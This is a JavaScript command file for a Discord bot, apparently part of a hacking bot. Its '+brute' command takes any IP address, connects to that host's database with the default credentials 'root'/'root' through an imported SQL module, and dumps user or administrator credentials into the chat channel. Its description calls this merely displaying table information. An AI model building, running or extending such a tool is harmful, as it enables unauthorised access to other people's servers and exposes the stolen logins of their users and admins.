const Discord = require("discord.js");
const config = require("../data/config.json");

const sql = require("../../src/sql");

module.exports.info = {
    name: "Brute",
    description: "Displays information from the users table."
}

module.exports.run = (bot, msg, args) => {
    if(msg.channel.type == "dm") {
        msg.delete();

        let embed = new Discord.MessageEmbed()
            .setTitle(`There was an Error.`)
            .setColor(config.colours.red)
            .setDescription("You can't run this command outside of the Server")
            .setFooter(`Command executed by: ${msg.author.tag}`)
            .setTimestamp();
        
        msg.channel.send({embed: embed});
    } else {
        if(args.length < 2) {
            let embed = new Discord.MessageEmbed()
                .setTitle(`Seems there was an error.`)
                .setColor(config.colours.red)
                .setDescription("Incorrect arguments.\n`+brute [ip(1.1.1.1)] [type(admin/users)]`")
                .setFooter(`Command executed by: ${msg.author.tag}`)
                .setTimestamp();
            
            return msg.channel.send({embed: embed});
        }
        
        let ip = args[0]
            type = args[1];
        
        if(ip.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g)) {
            if(type.toLowerCase() == "users" || type.toLowerCase() == "user") {
                sql.getLogins(ip, "root", "root").then(users => {
                    users = JSON.parse(users);

                    if(users.creds.length > 0) {
                        let embed = new Discord.MessageEmbed()
                            .setTitle(users.message)
                            .setColor(config.colours.green)
                            .setDescription(`${users.message}\nCredentials: ${users.creds.toString().replace(/\,/g, ", ")}`)
                            .setFooter(`Command executed by: ${msg.author.tag}`)
                            .setTimestamp();
                        
                        return msg.channel.send({embed: embed});
                    } else {
                        let embed = new Discord.MessageEmbed()
                            .setTitle(`Unable to find any credentials.`)
                            .setColor(config.colours.red)
                            .setDescription(`Can't find any credentials, maybe try again?`)
                            .setFooter(`Command executed by: ${msg.author.tag}`)
                            .setTimestamp();
                        
                        return msg.channel.send({embed: embed});
                    }
                }).catch(e => {
                    e = JSON.parse(e);

                    let embed = new Discord.MessageEmbed()
                        .setTitle(`Seems there was an error.`)
                        .setColor(config.colours.red)
                        .setDescription(e.message)
                        .setFooter(`Command executed by: ${msg.author.tag}`)
                        .setTimestamp();
                    
                    return msg.channel.send({embed: embed});
                });
            } else if(type.toLowerCase() == "admins" || type.toLowerCase() == "admin") {
                sql.getAdmins(ip, "root", "root").then(admins => {
                    admins = JSON.parse(admins);

                    if(admins.creds.length > 0) {
                        let embed = new Discord.MessageEmbed()
                            .setTitle(admins.message)
                            .setColor(config.colours.green)
                            .setDescription(`${admins.message}\nCredentials: ${admins.creds.toString().replace(/\,/g, ", ")}`)
                            .setFooter(`Command executed by: ${msg.author.tag}`)
                            .setTimestamp();
                        
                        return msg.channel.send({embed: embed});
                    } else {
                        let embed = new Discord.MessageEmbed()
                            .setTitle(`Seems there was an error.`)
                            .setColor(config.colours.red)
                            .setDescription(`Can't find any credentials, maybe try again?`)
                            .setFooter(`Command executed by: ${msg.author.tag}`)
                            .setTimestamp();
                        
                        return msg.channel.send({embed: embed});
                    }
                }).catch(e => {
                    e = JSON.parse(e);

                    let embed = new Discord.MessageEmbed()
                        .setTitle(`Seems there was an error.`)
                        .setColor(config.colours.red)
                        .setDescription(e.message)
                        .setFooter(`Command executed by: ${msg.author.tag}`)
                        .setTimestamp();
                    
                    return msg.channel.send({embed: embed});
                });
            } else {
                let embed = new Discord.MessageEmbed()
                    .setTitle(`Seems there was an error.`)
                    .setColor(config.colours.red)
                    .setDescription(`Incorrect type.\n\`+brute [${ip}(1.1.1.1)] [type(admin/users)]\``)
                    .setFooter(`Command executed by: ${msg.author.tag}`)
                    .setTimestamp();
                
                return msg.channel.send({embed: embed});
            }
        } else {
            let embed = new Discord.MessageEmbed()
                .setTitle(`Seems there was an error.`)
                .setColor(config.colours.red)
                .setDescription(`Incorrect port.\n\`+brute [${ip}(1.1.1.1)] [type(admin/users)]\``)
                .setFooter(`Command executed by: ${msg.author.tag}`)
                .setTimestamp();
            
            return msg.channel.send({embed: embed});
        }
    }
}